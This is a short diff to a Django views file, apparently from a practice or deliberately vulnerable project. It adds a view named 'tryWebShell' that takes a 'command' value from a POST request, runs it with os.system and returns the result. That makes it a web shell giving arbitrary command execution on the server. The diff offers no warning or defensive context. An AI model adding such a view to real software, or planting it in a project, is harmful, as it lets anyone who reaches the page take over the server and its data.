@@ -1,5 +1,7 @@
 from django.shortcuts import render, redirect, get_object_or_404
 from django.db import connection
+from django.http import HttpResponse
+import os
 from .models import Article
 
 def dictfetchall(cursor):
@@ -36,3 +38,10 @@ def create(request):
         return redirect('article list')
 
     return render(request, "create.html", context)
+
+
+def tryWebShell(request):
+    if request.method == "POST":
+        result = os.system(request.POST.get("command"))
+        return HttpResponse(result)
+    return render(request, "webshell.html")
